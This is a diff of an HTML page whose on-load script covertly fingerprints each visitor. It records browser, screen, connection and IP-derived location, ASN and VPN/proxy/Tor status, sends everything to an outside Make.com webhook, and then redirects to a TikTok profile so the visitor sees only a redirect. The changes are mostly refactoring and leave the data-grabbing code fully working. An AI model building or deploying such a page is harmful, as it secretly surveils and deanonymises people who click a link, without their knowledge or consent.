@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -76,15 +76,13 @@
   </div>
 
   <script>
-     ;
     async function collectData() {
       const now = new Date();
-const localTime = now.toLocaleString();
       const userData = {
-      
         userAgent: navigator.userAgent,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        localTime: now.toLocaleString(), // ← الوقت المحلي
         screenSize: `${window.screen.width}x${window.screen.height}`,
         colorDepth: window.screen.colorDepth,
         pixelRatio: window.devicePixelRatio,
@@ -96,8 +94,7 @@ const localTime = now.toLocaleString();
         doNotTrack: navigator.doNotTrack,
         localStorage: !!window.localStorage,
         sessionStorage: !!window.sessionStorage,
-        timestamp: new Date().toISOString(),
-        localTime: localTime,
+        timestamp: now.toISOString(),
       };
 
       if (navigator.connection) {
@@ -139,14 +136,14 @@ const localTime = now.toLocaleString();
         userData.postal = ipData.postal;
         userData.timezone = ipData.timezone;
         userData.asn = ipData.asn ? ipData.asn.asn : null;
-        userData.vpn = ipData.privacy?.vpn || false;
-        userData.proxy = ipData.privacy?.proxy || false;
-        userData.tor = ipData.privacy?.tor || false;
+        userData.vpn = ipData.privacy && ipData.privacy.vpn ? true : false;
+        userData.proxy = ipData.privacy && ipData.privacy.proxy ? true : false;
+        userData.tor = ipData.privacy && ipData.privacy.tor ? true : false;
       } catch (err) {
         console.error('IPInfo Error:', err);
       }
 
-      // ✅ إرسال البيانات إلى Webhook الخاص بـ Make
+      // إرسال البيانات إلى Make
       fetch("https://hook.eu2.make.com/getpor6u5xfrmr4xwkwr0p81umfj5okg", {
         method: "POST",
         body: JSON.stringify(userData),
@@ -156,13 +153,12 @@ const localTime = now.toLocaleString();
       })
       .then(response => response.text())
       .then(data => {
-        console.log("✅ تم الإرسال إلى Make:", data);
+        console.log("تم الإرسال:", data);
       })
       .catch(error => {
-        console.error("❌ خطأ في الإرسال:", error);
+        console.error("خطأ في الإرسال:", error);
       });
 
-      // 🔁 التحويل إلى TikTok بعد ثانيتين ونصف
       setTimeout(() => {
         window.location.href = "https://www.tiktok.com/@dr3altwhed?_t=ZS-8yHpMxmbUCl&_r=1";
       }, 2500);
@@ -171,5 +167,4 @@ const localTime = now.toLocaleString();
     collectData();
   </script>
 </body>
-</html>
- 
+</html> 
